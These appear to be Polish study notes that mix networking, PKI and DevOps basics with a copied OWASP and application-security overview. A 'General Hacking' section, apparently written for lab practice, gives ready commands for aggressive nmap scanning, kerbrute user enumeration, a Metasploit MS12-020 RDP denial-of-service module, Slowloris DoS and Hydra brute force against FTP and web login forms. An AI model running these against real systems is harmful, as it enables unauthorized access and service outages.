Protokół SNMP wykorzystuje hierarchiczną strukturę zarządzania, w której zarządca komunikuje się z agentami za pomocą tzw. PDU (Protocol Data Units), takich jak GetRequest (żądanie odczytu wartości), SetRequest (żądanie zmiany wartości), Trap (powiadomienie o zdarzeniu) itp.

Płyty CD, DVD i Blu-ray to dyski optyczne, które mogą pomieścić

700 MB−5 0  GBdanych i są często używane do dystrybucji muzyki, filmów i oprogramowania do gier. Dyski ROM, takie jak DVD-ROM, są tylko do odczytu, a zapisanych danych nie można zmienić ani nadpisać. Dyski wielokrotnego zapisu, takie jak dyski DVD-RAM, są przeznaczone do odczytu i zapisu, a zapisane dane można zmieniać lub nadpisywać.


Dyski twarde to obracające się dyski magnetyczne, które mogą pomieścić do kilku TB danych. Są często używane jako główna pamięć na komputerach do przechowywania plików i folderów. Szybkość dostępu do danych jest duża w przypadku dostępu sekwencyjnego i zmniejsza się w przypadku dostępu losowego. Dostęp sekwencyjny to odczyt lub zapis z ciągłego fragmentu danych. Dostęp swobodny to odczyt lub zapis z różnych miejsc na dysku.

Co to jest infrastruktura klucza publicznego (PKI) - PKI, czyli infrastruktura 
klucza publicznego, obejmuje wszystko, co służy do ustanowienia szyfrowania klucza publicznego i zarządzania nim. Obejmuje to oprogramowanie, sprzęt, zasady i procedury używane do tworzenia, dystrybucji, zarządzania, przechowywania i unieważniania certyfikatów cyfrowych. 

Certyfikat cyfrowy łączy kryptograficznie klucz publiczny z urządzeniem lub użytkownikiem, który jest jego właścicielem. Pomaga to uwierzytelniać użytkowników i urządzenia oraz zapewniać bezpieczną komunikację cyfrową. 

PKI jest jedną z najpopularniejszych form szyfrowania Internetu i służy do zabezpieczania i uwierzytelniania ruchu między przeglądarkami internetowymi a serwerami internetowymi. Może być również używany do zabezpieczania dostępu do podłączonych urządzeń i komunikacji wewnętrznej w organizacji. 

Infrastruktura klucza publicznego ma długą historię zabezpieczania i uwierzytelniania komunikacji cyfrowej z dwoma głównymi celami : zapewnienie prywatności wysyłanej wiadomości i zweryfikowanie, czy nadawca jest tym, za kogo się podaje.

Co to jest infrastruktura klucza publicznego (PKI)?
Infrastruktura klucza publicznego jest ważnym aspektem bezpieczeństwa w Internecie. Jest to zestaw technologii i procesów, które tworzą ramy szyfrowania w celu ochrony i uwierzytelniania komunikacji cyfrowej. 

PKI wykorzystuje kryptograficzne klucze publiczne, które są połączone z certyfikatem cyfrowym, który uwierzytelnia urządzenie lub użytkownika wysyłającego komunikację cyfrową. Certyfikaty cyfrowe są wydawane przez zaufane źródło, urząd certyfikacji (CA) i działają jak rodzaj cyfrowego paszportu, aby upewnić się, że nadawca jest tym, za kogo się podaje.

Infrastruktura klucza publicznego chroni i uwierzytelnia komunikację między serwerami i użytkownikami, na przykład między Twoją witryną internetową (hostowaną na Twoim serwerze internetowym) a klientami (użytkownikiem próbującym połączyć się za pośrednictwem przeglądarki. Może być również używana do bezpiecznej komunikacji w organizacji, aby zapewnić że wiadomości są widoczne tylko dla nadawcy i odbiorcy i nie zostały naruszone podczas przesyłania. 

Do głównych elementów infrastruktury klucza publicznego należą:

Urząd certyfikacji (CA): Urząd certyfikacji to zaufany podmiot, który wydaje, przechowuje i podpisuje certyfikat cyfrowy. Urząd certyfikacji podpisuje certyfikat cyfrowy własnym kluczem prywatnym, a następnie publikuje klucz publiczny, do którego można uzyskać dostęp na żądanie.
Urząd rejestracji (RA): Urząd certyfikacji weryfikuje tożsamość użytkownika lub urządzenia żądającego certyfikatu cyfrowego. Może to być strona trzecia lub CA może również działać jako RA.  
Baza danych certyfikatów: ta baza danych przechowuje certyfikat cyfrowy i jego metadane, w tym okres ważności certyfikatu.
Katalog centralny: Jest to bezpieczna lokalizacja, w której są indeksowane i przechowywane klucze kryptograficzne.  
System zarządzania certyfikatami: Jest to system zarządzania dostarczaniem certyfikatów oraz dostępem do nich.  
Polityka certyfikacji: Ta polityka określa procedury PKI. Może być używany przez osoby z zewnątrz w celu określenia wiarygodności infrastruktury PKI.

![2f6e4db00fd6de15dad795e5d2d4341b.png](:/1f1df681bf29446ab37ff4f803f164c1)

Pod pojęciem technologii informacyjnych i komunikacyjnych (w skrócie ICT, z ang. information and communication technologies, nazywanych zamiennie technologiami informacyjno-telekomunikacyjnymi, teleinformatycznymi lub technikami informacyjnymi) kryje się rodzina technologii przetwarzających, gromadzących i przesyłających informacje w formie elektronicznej.

Węższym pojęciem są technologie informatyczne (IT), które odnoszą się do technologii związanych z komputerami i oprogramowaniem, nie związanych jednak z technologiami komunikacyjnymi i dotyczącymi sieci. Rozwój tych technologii sprawia, że oba pojęcia stają się coraz bardziej spójne, będący przy tym motorem rozwoju cywilizacyjnego, społecznego i gospodarczego.
(IT - information technology chyba)

**DevOps** odpowiada za kwestie związane z automatyzacją procesów w projekcie m.in. za zorganizowanie środowiska lokalnego, repozytorium kodu, infrastrukturę czy pipeline CI/CD. DevOps to po prostu konkretna rola projektowa i specjalizacja, tak samo jak programista czy tester.

Założę się, że większość z Was spotkała się z określeniem, że “DevOps to kultura”. Oznacza to w gruncie rzeczy, że każdy członek zespołu powinien być w pewnym sensie DevOpsem.

Jednak to nie takie proste.

Umiejętności związane z chmurą, automatyzacją pipeline’ów CI/CD, NAPRAWDĘ DOBRA znajomość narzędzi typu terraform czy Jenkins, dogłębna wiedza o cyklu wytwarzania oprogramowania… To cały zestaw umiejętności, które trzeba nieustannie rozwijać


**Termin DevOps**, powstały z połączenia słów „development” (programowanie) i „operations” (operacje), określa metodykę łączącą ludzi, procesy i technologie, aby umożliwić ciągłe dostarczanie wartości klientom.

Co metodyka DevOps oznacza dla zespołów? Metodyka DevOps umożliwia odrębnym wcześniej rolom — zespołom ds. programowania, operacji IT, inżynierii jakości i zabezpieczeń — koordynowanie i współpracę w celu tworzenia lepszych, bardziej niezawodnych produktów. Stosując kulturę DevOps wraz z narzędziami i praktykami DevOps, zespoły zyskują możliwość lepszego reagowania na potrzeby klientów, zwiększają zaufanie w tworzone aplikacje i szybciej realizują cele biznesowe.

print working directory - pwd (patrzy w jakim katalogu aktualnie jesteś)

https://brilliant.org/courses/#/computer-science#/computer-science


Pliki .dsp i .dsw to pliki projektu i rozwiązania Visual Studio, które zawierają ustawienia i informacje o plikach źródłowych, bibliotekach i narzędziach używanych do budowania aplikacji1.
Pliki .ncb to pliki bazy danych IntelliSense, które przechowują informacje o symbolach i kodzie źródłowym w Visual Studio2.
Pliki .opt to pliki opcji projektu, które zawierają ustawienia środowiska i preferencje użytkownika w Visual Studio2.
Pliki .plg to pliki dziennika kompilacji, które rejestrują wyniki budowania projektu w Visual Studio2.
Pliki .tlh i .tli to pliki nagłówkowe generowane automatycznie przez Visual Studio, które zawierają deklaracje typów i funkcji z bibliotek typów COM3.
Plik .cmd to plik wsadowy, który zawiera polecenia wykonywane przez interpreter poleceń Windows3.


https://pasja-informatyki.pl/sieci-komputerowe/jednostki-danych-w-sieciach/

Ethernet – technika, w której zawarte są standardy wykorzystywane w budowie głównie lokalnych sieci komputerowych. Obejmuje ona specyfikację przewodów oraz przesyłanych nimi sygnałów. Ethernet opisuje również format ramek i protokoły z dwóch najniższych warstw Modelu OSI. Jego pierwotna specyfikacja została podana w standardzie IEEE 802.3.
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
# General Hacking

Co to jest AD (Active Directory)?
Active Directory obsługuje szereg funkcji, takich jak uwierzytelnianie, zarządzanie grupami i użytkownikami, administrowanie zasadami i wiele innych.
AD może wykorzystywać zarówno protokół Kerberos, jak i LDAP do uwierzytelniania, co czyni go obecnie najczęściej używaną usługą katalogową.

**NMAP**:
* * *-sV do włączenia wykrywania wersji
* * *-sC do uruchamiania z domyślnymi skryptami NSE
* * *-A dla włączenia trybu agresywnego (włącza wykrywanie systemu operacyjnego, wykrywanie wersji, traceroute, skanowanie skryptów)
* * *-T4 do ustawienia szybkości skanowania w trybie 4
* * *-on dla zapisania wyjścia
* `sudo nmap -sV -sC -A -T4 -oN nmap.out 10.10.91.162`
* sudo nmap --open -A -O -Ss IP

LDAP jest podstawowym środkiem komunikacji między usługami katalogowymi a aplikacjami. Jeśli chodzi o konta użytkowników, usługi katalogowe przechowują informacje, takie jak nazwy, hasła i konta komputerów, i przekazują te informacje innym podmiotom sieciowym.

-----------------------------------------------------------------------------
## NARZĘDZIA
**Enum4linux -  to narzędzie do wyliczania informacji z systemów Windows i Samba.
Korzystając z tego narzędzia, możemy zidentyfikować informacje o udostępnianiu, informacje o użytkownikach i grupach użytkowników, informacje DNS, identyfikację zdalnego systemu operacyjnego, cykliczne RID, odzyskiwanie polityki haseł, informacje NetBIOS itp**

KOMENDA ` IP`

`echo "10.10.91.162 spookysec.local" | sudo tee -a /etc/hosts`  
 spooksec to nazwa domeny 10.10 to adres ip atakowanej maszyny reszta komendy to dodanie tej "strony" do /etc/hosts 
 
 WYSZUKIWANIE: ./kerbrute userenum --dc domena-z-nmap-domain-name -d domena-z-nmap-domain-name userlist.txt

Manipulacja bitami to czynność polegająca na manipulowaniu bitami w celu wykrycia błędów (kodu Hamminga), szyfrowania i odszyfrowywania wiadomości

przydatne - https://github.com/foobarto/redteam-notebook
 
 https://github.com/paulsec/awesome-sec-talks

--------------------------------------------------------------------------------------------------
METASPLOIT

CVE-2012-0002 Exploit - 
`use auxiliary/dos/windows/rdp/ms12_020_maxchannelids`
`RHOST IP CELU`
`run`
-----------------------------------------------------------------------------
sudo nmap 10.10.171.213 --script vuln

Powolny atak Loris:
`cd PySlowLoris`
`proxychains python3 src/main.py IP:443`

HYDRA:
hydra -l username -P sql.txt ftp://IP

Możemy również użyć Hydry do bruteforce formularzy internetowych, musisz upewnić się, że wiesz, jakiego typu żądania są tworzone - zwykle używane są metody GET lub POST. Możesz użyć karty sieci przeglądarki (w narzędziach programistycznych), aby zobaczyć typy żądań lub po prostu wyświetlić kod źródłowy.

Poniżej znajduje się przykładowe polecenie Hydra do brutalnego wymuszenia formularza logowania POST:

hydra -l <username> -P <wordlist> MACHINE_IP http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V

Co to jest bezpieczeństwo aplikacji?
Bezpieczeństwo aplikacji ma na celu ochronę kodu aplikacji i danych przed zagrożeniami cybernetycznymi. Możesz i powinieneś stosować zabezpieczenia aplikacji we wszystkich fazach rozwoju, w tym projektowania, programowania i wdrażania.

Oto kilka sposobów promowania bezpieczeństwa aplikacji w całym cyklu rozwoju oprogramowania (SDLC):

Wprowadzaj standardy i narzędzia bezpieczeństwa na etapie projektowania i tworzenia aplikacji. Na przykład uwzględnij skanowanie podatności na wczesnym etapie rozwoju.
Implementuj procedury i systemy bezpieczeństwa w celu ochrony aplikacji w środowiskach produkcyjnych. Na przykład wykonuj ciągłe testy bezpieczeństwa.
Zaimplementuj silne uwierzytelnianie dla aplikacji, które zawierają poufne dane lub mają krytyczne znaczenie.
Korzystaj z systemów bezpieczeństwa, takich jak zapory, zapory aplikacji internetowych (WAF) i systemy zapobiegania włamaniom (IPS).
Jakie typy aplikacji musi zabezpieczyć nowoczesna organizacja?
Bezpieczeństwo aplikacji internetowych
Aplikacja internetowa to oprogramowanie działające na serwerze sieciowym i dostępne przez Internet. Klient działa w przeglądarce internetowej. Z natury aplikacje muszą akceptować połączenia od klientów przez niezabezpieczone sieci . Naraża to ich na szereg luk w zabezpieczeniach. Wiele aplikacji internetowych ma kluczowe znaczenie dla działalności biznesowej i zawiera wrażliwe dane klientów, co czyni je cennym celem dla atakujących i ma wysoki priorytet dla każdego programu bezpieczeństwa cybernetycznego .

Ewolucja Internetu zajęła się pewnymi lukami w aplikacjach internetowych – takimi jak wprowadzenie protokołu HTTPS, który tworzy zaszyfrowany kanał komunikacyjny, który chroni przed atakami typu „man in the middle” (MitM). Pozostało jednak wiele luk w zabezpieczeniach. Najpoważniejsze i najczęstsze luki w zabezpieczeniach są udokumentowane przez Open Web Application Security Project (OWASP) w formie OWASP Top 10.

Ze względu na narastający problem bezpieczeństwa aplikacji internetowych, wielu producentów zabezpieczeń wprowadziło rozwiązania zaprojektowane specjalnie do zabezpieczania aplikacji internetowych. Przykładem może być zapora aplikacji internetowej (WAF), narzędzie zabezpieczające zaprojektowane do wykrywania i blokowania ataków w warstwie aplikacji.

Dowiedz się więcej w naszym szczegółowym przewodniku po bezpieczeństwie stron internetowych

Bezpieczeństwo API
Coraz większe znaczenie mają interfejsy programowania aplikacji (API). Stanowią one podstawę nowoczesnych aplikacji mikroserwisowych i powstała cała ekonomia API, która pozwala organizacjom na współdzielenie danych i dostęp do funkcjonalności oprogramowania stworzonego przez innych. Oznacza to, że bezpieczeństwo API ma kluczowe znaczenie dla nowoczesnych organizacji.

API, które cierpią z powodu luk w zabezpieczeniach , są przyczyną poważnych naruszeń bezpieczeństwa danych . Mogą ujawnić wrażliwe dane i spowodować zakłócenia w krytycznych operacjach biznesowych. Częstymi słabościami zabezpieczeń interfejsów API są słabe uwierzytelnianie, niechciane narażenie danych i brak ograniczenia szybkości, co umożliwia nadużycia interfejsu API.

Podobnie jak bezpieczeństwo aplikacji internetowych, potrzeba bezpieczeństwa API doprowadziła do rozwoju wyspecjalizowanych narzędzi, które mogą identyfikować luki w API i zabezpieczać API w środowisku produkcyjnym.

Dowiedz się więcej ze szczegółowego przewodnika po zabezpieczeniach API

Bezpieczeństwo aplikacji natywnych w chmurze
Aplikacje natywne dla chmury to aplikacje zbudowane w architekturze mikrousług przy użyciu technologii takich jak maszyny wirtualne, kontenery i platformy bezserwerowe. Zabezpieczenia natywne w chmurze to złożone wyzwanie, ponieważ aplikacje natywne dla chmury mają dużą liczbę ruchomych części i komponentów, które mają tendencję do bycia efemerycznych — często rozbieranych i zastępowanych przez inne. Utrudnia to uzyskanie wglądu w natywne środowisko chmury i zapewnienie bezpieczeństwa wszystkich komponentów.

W aplikacjach natywnych dla chmury infrastruktura i środowiska są zazwyczaj konfigurowane automatycznie w oparciu o konfigurację deklaratywną — nazywa się to infrastrukturą jako kodem (IaC). Deweloperzy są odpowiedzialni za tworzenie konfiguracji deklaratywnych i kodu aplikacji, a oba te elementy powinny podlegać względom bezpieczeństwa. Przesunięcie w lewo jest znacznie ważniejsze w środowiskach natywnych dla chmury, ponieważ prawie wszystko jest ustalane na etapie rozwoju.

Aplikacje natywne dla chmury mogą korzystać z tradycyjnych narzędzi testowych, ale te narzędzia nie wystarczą. Potrzebne są dedykowane narzędzia bezpieczeństwa natywne dla chmury, które są w stanie oprzyrządować kontenery, klastry kontenerów i funkcje bezserwerowe, zgłaszać problemy z bezpieczeństwem i zapewniać szybką pętlę informacji zwrotnych dla programistów.

Innym ważnym aspektem bezpieczeństwa natywnego w chmurze jest automatyczne skanowanie wszystkich artefaktów na wszystkich etapach cyklu rozwoju. Co najważniejsze, organizacje muszą skanować obrazy kontenerów na wszystkich etapach procesu rozwoju.

Dowiedz się więcej w szczegółowych przewodnikach do:

Architektura kontenerowa
Architektura bezserwerowa
Zagrożenia bezpieczeństwa aplikacji
Zagrożenia bezpieczeństwa aplikacji internetowych: OWASP Top 10
Aplikacje mogą być narażone na wiele zagrożeń. Lista Top 10 Open Web Application Security Project (OWASP) zawiera krytyczne zagrożenia aplikacji, które najprawdopodobniej wpłyną na aplikacje w środowisku produkcyjnym.

Uszkodzona kontrola dostępu
Uszkodzona kontrola dostępu umożliwia zagrożeniom i użytkownikom uzyskanie nieautoryzowanego dostępu i uprawnień. Oto najczęstsze problemy:

Umożliwia atakującym uzyskanie nieautoryzowanego dostępu do kont użytkowników i działanie jako administratorzy lub zwykli użytkownicy.
Zapewnia użytkownikom nieautoryzowane funkcje uprzywilejowane.
Możesz rozwiązać ten problem, wdrażając silne mechanizmy dostępu, które zapewniają, że każda rola jest jasno zdefiniowana z izolowanymi uprawnieniami.

Błędy kryptograficzne
Awarie kryptograficzne (wcześniej określane jako „narażenie danych wrażliwych”) występują, gdy dane nie są odpowiednio chronione podczas przesyłania i przechowywania. Może ujawniać hasła, dokumentację medyczną, numery kart kredytowych i dane osobowe.

To zagrożenie bezpieczeństwa aplikacji może prowadzić do nieprzestrzegania przepisów dotyczących prywatności danych, takich jak Ogólne rozporządzenie o ochronie danych UE (RODO) oraz standardów finansowych, takich jak PCI Data Security Standards (PCI DSS).

Wstrzyknięcie (w tym XSS, LFI i wstrzyknięcie SQL)
Luki w zabezpieczeniach wstrzykiwane umożliwiają cyberprzestępcom wysyłanie złośliwych danych do interpretera aplikacji internetowych. Może to spowodować kompilację i wykonanie tych danych na serwerze. Wstrzykiwanie SQL jest powszechną formą wstrzykiwania .

Dowiedz się więcej w szczegółowych przewodnikach do:

Skrypty między witrynami (XSS)
Wstrzykiwanie pliku lokalnego (LFI)
Wstrzyknięcie SQL (SQLi)
Fałszowanie żądań między witrynami (CSRF)
Niepewny projekt
Niepewny projekt obejmuje wiele słabości aplikacji, które występują z powodu nieskutecznych lub brakujących kontroli bezpieczeństwa. Aplikacje, które nie mają podstawowych mechanizmów kontroli bezpieczeństwa, które są w stanie stawić czoła krytycznym zagrożeniom. Chociaż można naprawić wady implementacji w aplikacjach z bezpiecznym projektem, nie jest możliwe naprawienie niezabezpieczonego projektu za pomocą odpowiedniej konfiguracji lub środków zaradczych.

Błędna konfiguracja zabezpieczeń (w tym XXE)
Błędy w konfiguracji zabezpieczeń występują z powodu braku wzmocnienia zabezpieczeń w stosie aplikacji. Oto typowe błędy konfiguracji zabezpieczeń:

Nieprawidłowa konfiguracja uprawnień do usług w chmurze
Pozostawienie włączonych lub zainstalowanych niepotrzebnych funkcji
Korzystanie z domyślnych haseł lub kont administratora
Luki w zabezpieczeniach zewnętrznych jednostek XML (XXE)
Dowiedz się więcej ze szczegółowego przewodnika po zewnętrznych jednostkach XML (XXE)

Podatne i przestarzałe komponenty
Podatne i nieaktualne składniki (wcześniej określane jako „używające składników ze znanymi lukami”) obejmują wszelkie luki wynikające z nieaktualnego lub nieobsługiwanego oprogramowania. Może wystąpić, gdy tworzysz lub używasz aplikacji bez wcześniejszej znajomości jej wewnętrznych składników i wersji.

Błędy identyfikacji i uwierzytelniania
Błędy identyfikacji i uwierzytelniania (wcześniej określane jako „uszkodzone uwierzytelnianie”) obejmują wszelkie problemy z bezpieczeństwem związane z tożsamościami użytkowników. Możesz chronić się przed atakami na tożsamość i exploitami, ustanawiając bezpieczne zarządzanie sesjami oraz konfigurując uwierzytelnianie i weryfikację dla wszystkich tożsamości.

Awarie oprogramowania i integralności danych
Awarie oprogramowania i integralności danych występują, gdy infrastruktura i kod są podatne na naruszenia integralności. Może wystąpić podczas aktualizacji oprogramowania, modyfikacji poufnych danych i wszelkich zmian potoku CI/CD, które nie zostały zweryfikowane. Niezabezpieczone potoki CI/CD mogą skutkować nieautoryzowanym dostępem i prowadzić do ataków w łańcuchu dostaw.

Rejestrowanie bezpieczeństwa i monitorowanie awarii
Awarie rejestrowania i monitorowania zabezpieczeń (wcześniej określane jako „niewystarczające rejestrowanie i monitorowanie”) występują, gdy słabości aplikacji nie mogą prawidłowo wykryć zagrożeń bezpieczeństwa i na nie reagować. Logowanie i monitorowanie mają kluczowe znaczenie dla wykrywania naruszeń. Gdy te mechanizmy nie działają, utrudnia to widoczność aplikacji oraz zagraża alarmom i informacjom śledczym.

Fałszerstwo żądania po stronie serwera
Luki w zabezpieczeniach związane z fałszowaniem żądań po stronie serwera (SSRF) występują, gdy aplikacja sieci Web nie sprawdza poprawności adresu URL wprowadzonego przez użytkownika przed pobraniem danych ze zdalnego zasobu. Może mieć wpływ na serwery chronione zaporą ogniową i dowolną listę kontroli dostępu do sieci (ACL), która nie weryfikuje adresów URL.

Dowiedz się więcej w szczegółowym przewodniku po SSRF

Dowiedz się o dodatkowych zagrożeniach cybernetycznych z naszego przewodnika po cyberatakach

Zagrożenia bezpieczeństwa API: OWASP Top 10
Interfejsy API umożliwiają komunikację między różnymi częściami oprogramowania. Aplikacje z interfejsami API umożliwiają zewnętrznym klientom żądanie usług z aplikacji. Interfejsy API są narażone na różne zagrożenia i luki w zabezpieczeniach. OWASP skompilował listę, w której określono priorytety 10 najważniejszych zagrożeń bezpieczeństwa API.

Autoryzacja na poziomie uszkodzonych obiektów
Interfejsy API często ujawniają punkty końcowe obsługujące identyfikatory obiektów. Tworzy to szerszą powierzchnię ataku, problem kontroli dostępu na poziomie. Zamiast tego należy sprawdzić autoryzację na poziomie obiektu w każdej funkcji, która może uzyskać dostęp do źródła danych za pośrednictwem danych wejściowych użytkownika.

Uszkodzone uwierzytelnianie użytkownika
Nieprawidłowo zaimplementowane mechanizmy uwierzytelniania mogą zapewnić nieautoryzowany dostęp złośliwym podmiotom. Umożliwia atakującym wykorzystanie luki w implementacji lub złamanie zabezpieczeń tokenów uwierzytelniania . Gdy to nastąpi, osoby atakujące mogą na stałe lub tymczasowo przyjąć legalną tożsamość użytkownika. W rezultacie zdolność systemu do identyfikacji klienta lub użytkownika jest zagrożona, co zagraża ogólnemu bezpieczeństwu API aplikacji.

Nadmierna ekspozycja na dane
Implementacje ogólne często prowadzą do ujawnienia wszystkich właściwości obiektu bez uwzględniania indywidualnej wrażliwości każdego obiektu. Występuje, gdy programiści polegają na klientach w celu filtrowania danych przed wyświetleniem informacji użytkownikowi.

Brak zasobów i ograniczenie szybkości
Interfejsy API zwykle nie nakładają ograniczeń na liczbę lub rozmiar zasobów, o które może poprosić klient lub użytkownik. Jednak ten problem może wpłynąć na wydajność serwera API i spowodować odmowę usługi (DoS). Dodatkowo może tworzyć luki w uwierzytelnianiu, które umożliwiają ataki typu brute force.

Autoryzacja złamanego poziomu funkcji
Luki autoryzacji umożliwiają atakującym uzyskanie nieautoryzowanego dostępu do zasobów legalnych użytkowników lub uzyskanie uprawnień administracyjnych. Może wystąpić w wyniku nadmiernie skomplikowanych polityk kontroli dostępu opartych na różnych hierarchiach, rolach, grupach oraz niejasnym rozdzieleniu funkcji zwykłych i administracyjnych.

Zadanie masowe
Przypisanie masowe jest zwykle wynikiem nieprawidłowego powiązania danych dostarczonych przez klientów, takich jak JSON, z modelami danych. Występuje, gdy wiązanie odbywa się bez użycia filtrowania właściwości na podstawie listy dozwolonych. Umożliwia atakującym odgadnięcie właściwości obiektu, przeczytanie dokumentacji, zbadanie innych punktów końcowych interfejsu API lub dostarczenie dodatkowych właściwości obiektu w celu żądania ładunku.

Błędna konfiguracja zabezpieczeń
Błędna konfiguracja zabezpieczeń zwykle występuje z powodu:

Niebezpieczne konfiguracje domyślne
Otwórz magazyn w chmurze
Konfiguracje ad hoc lub niekompletne
Błędnie skonfigurowane nagłówki HTTP
Permisywne udostępnianie zasobów między źródłami (CORS)
Niepotrzebne metody HTTP
Szczegółowe komunikaty o błędach zawierające poufne informacje
Zastrzyk
Błędy wstrzykiwania, takie jak wstrzykiwanie poleceń, wstrzykiwanie SQL i wstrzykiwanie NoSQL, występują, gdy zapytanie lub polecenie wysyła niezaufane dane do interpretera. Są to zazwyczaj złośliwe dane, które próbują nakłonić tłumacza do zapewnienia nieautoryzowanego dostępu do danych lub wykonania niezamierzonych poleceń.

Niewłaściwe zarządzanie aktywami
Interfejsy API zwykle udostępniają więcej punktów końcowych niż tradycyjne aplikacje internetowe. Ten charakter interfejsów API oznacza, że ​​właściwa i zaktualizowana dokumentacja staje się kluczowa dla bezpieczeństwa. Ponadto odpowiedni wykaz hostów i wdrożonych wersji interfejsu API może pomóc złagodzić problemy związane z ujawnionymi punktami końcowymi debugowania i przestarzałymi wersjami interfejsu API.

Niewystarczające rejestrowanie i monitorowanie
Niewystarczające rejestrowanie i monitorowanie umożliwia cyberprzestępcom eskalację swoich ataków, zwłaszcza gdy nie ma skutecznej integracji z reagowaniem na incydent lub nie jest ona zintegrowana . Umożliwia złośliwym podmiotom zachowanie trwałości i przechodzenie do innych systemów, w których wydobywają, niszczą lub manipulują danymi.

Co to jest testowanie bezpieczeństwa aplikacji?
Testowanie bezpieczeństwa aplikacji (AST) to proces zwiększania odporności aplikacji na zagrożenia bezpieczeństwa poprzez identyfikowanie i usuwanie luk w zabezpieczeniach.

Początkowo AST był procesem ręcznym. W nowoczesnych, szybkich procesach rozwoju AST musi być zautomatyzowany. Zwiększona modułowość oprogramowania dla przedsiębiorstw, liczne komponenty open source oraz duża liczba znanych luk w zabezpieczeniach i wektorów zagrożeń sprawiają, że automatyzacja jest niezbędna. Większość organizacji używa kombinacji narzędzi bezpieczeństwa aplikacji do prowadzenia AST.

Kluczowe uwagi przed testowaniem aplikacji

Oto kluczowe kwestie, które należy wziąć pod uwagę, zanim będzie można prawidłowo przetestować aplikacje pod kątem luk w zabezpieczeniach:

Utwórz kompletny spis swoich aplikacji.
Poznaj zastosowania biznesowe, wpływ i wrażliwość swoich aplikacji.
Określ, które aplikacje chcesz przetestować — zacznij od systemów dostępnych publicznie, takich jak aplikacje internetowe i mobilne.
Jak testować

Aby pomyślnie przetestować aplikacje pod kątem luk w zabezpieczeniach, musisz określić następujące parametry:

Testowanie uwierzytelnione a testowanie nieuwierzytelnione — można testować aplikacje z perspektywy osoby postronnej (podejście typu „czarna skrzynka”). Jednak przeprowadzanie uwierzytelnionych testów ma dużą wartość, aby wykryć problemy z bezpieczeństwem, które mają wpływ na uwierzytelnionych użytkowników. Może to pomóc w wykryciu luk w zabezpieczeniach, takich jak wstrzykiwanie SQL i manipulacja sesją.
Które narzędzia należy użyć — testowanie powinno w idealnym przypadku obejmować narzędzia, które mogą identyfikować luki w kodzie źródłowym, narzędzia, które mogą testować aplikacje pod kątem słabych punktów bezpieczeństwa w czasie wykonywania, oraz skanery luk w zabezpieczeniach sieci.
Testowanie produkcji a etapowanie — testowanie w środowisku produkcyjnym jest ważne, ponieważ pozwala zidentyfikować problemy z bezpieczeństwem, które obecnie zagrażają organizacji i jej klientom. Jednak testowanie produkcyjne może mieć wpływ na wydajność. Testowanie w stagingu jest łatwiejsze do osiągnięcia i pozwala na szybszą naprawę luk w zabezpieczeniach.
Niezależnie od tego, czy wyłączyć systemy bezpieczeństwa podczas testowania — w przypadku większości testów bezpieczeństwa dobrym pomysłem jest wyłączenie zapór ogniowych, zapór sieciowych aplikacji internetowych (WAF) i systemów zapobiegania włamaniom (IPS) lub przynajmniej dodanie adresów IP narzędzi testowych do białej listy, w przeciwnym razie narzędzia mogą zakłócać skanowanie. Jednak w pełnym teście penetracyjnym narzędzia należy pozostawić włączone, a celem jest skanowanie aplikacji bez wykrycia.
Kiedy testować — zazwyczaj zaleca się przeprowadzanie testów bezpieczeństwa w okresach wyłączenia, aby uniknąć wpływu na wydajność i niezawodność aplikacji produkcyjnych.
Co raportować — wiele narzędzi bezpieczeństwa dostarcza bardzo szczegółowe raporty dotyczące ich określonej domeny testowej, a raporty te nie są przeznaczone do użytku przez ekspertów spoza dziedziny bezpieczeństwa. Zespoły ds. bezpieczeństwa powinny wydobywać najistotniejsze spostrzeżenia z automatycznych raportów i przedstawiać je w znaczący sposób zainteresowanym stronom.
Testy walidacyjne — krytyczną częścią testów bezpieczeństwa jest sprawdzenie, czy działania naprawcze zostały wykonane pomyślnie. Deweloper nie wystarczy, aby powiedział, że naprawa została naprawiona. Musisz ponownie przeprowadzić test i upewnić się, że usterka już nie istnieje, lub w inny sposób przekazać opinię programistom.
Dowiedz się więcej ze szczegółowego przewodnika po:

Testy bezpieczeństwa
Zarządzanie zależnościami
Cykl życia oprogramowania (SDLC)
Rodzaje testów bezpieczeństwa aplikacji
Istnieją trzy główne typy testów bezpieczeństwa aplikacji:

Testowanie bezpieczeństwa czarnej skrzynki
W teście czarnej skrzynki system testujący nie ma dostępu do wnętrza testowanego systemu. To jest perspektywa atakującego z zewnątrz. Narzędzie testujące lub człowiek testujący musi przeprowadzić rozpoznanie w celu zidentyfikowania testowanych systemów i wykrycia luk w zabezpieczeniach. Testowanie czarnoskrzynkowe jest bardzo cenne, ale niewystarczające, ponieważ nie może przetestować podstawowych słabości zabezpieczeń aplikacji.

Dowiedz się więcej ze szczegółowego przewodnika po testach czarnoskrzynkowych

Testowanie bezpieczeństwa białej skrzynki
W teście białej skrzynki system testujący ma pełny dostęp do wnętrza testowanej aplikacji. Klasycznym przykładem jest statyczna analiza kodu, w której narzędzie testujące ma bezpośredni dostęp do kodu źródłowego aplikacji. Testowanie białej skrzynki może zidentyfikować luki w logice biznesowej, problemy z jakością kodu, błędne konfiguracje zabezpieczeń i niebezpieczne praktyki kodowania. Testowanie białoskrzynkowe może również obejmować testowanie dynamiczne, które wykorzystuje techniki fuzzingu do sprawdzania różnych ścieżek w aplikacji i wykrywania nieoczekiwanych luk w zabezpieczeniach. Wadą podejścia białoskrzynkowego jest to, że nie wszystkie te luki będą w rzeczywistości możliwe do wykorzystania w środowiskach produkcyjnych.

Dowiedz się więcej ze szczegółowego przewodnika po testowaniu białej skrzynki

Testy bezpieczeństwa szarej skrzynki
W teście szarej skrzynki system testujący ma dostęp do ograniczonych informacji na temat elementów wewnętrznych testowanej aplikacji. Na przykład tester może otrzymać poświadczenia logowania, aby mógł przetestować aplikację z perspektywy zalogowanego użytkownika. Testowanie szarej skrzynki może pomóc w zrozumieniu, jaki poziom dostępu mają uprzywilejowani użytkownicy oraz jaki poziom szkód mogliby wyrządzić w przypadku włamania na konto. Testy szarej skrzynki mogą symulować zagrożenia wewnętrzne lub napastników, którzy już naruszyli granicę sieci. Testowanie szarej skrzynki jest uważane za wysoce wydajne, zachowując równowagę między podejściem czarnej i białej skrzynki.

Dowiedz się więcej ze szczegółowego przewodnika po testach szarej skrzynki

Narzędzia i rozwiązania bezpieczeństwa aplikacji
Zapora aplikacji internetowej (WAF)
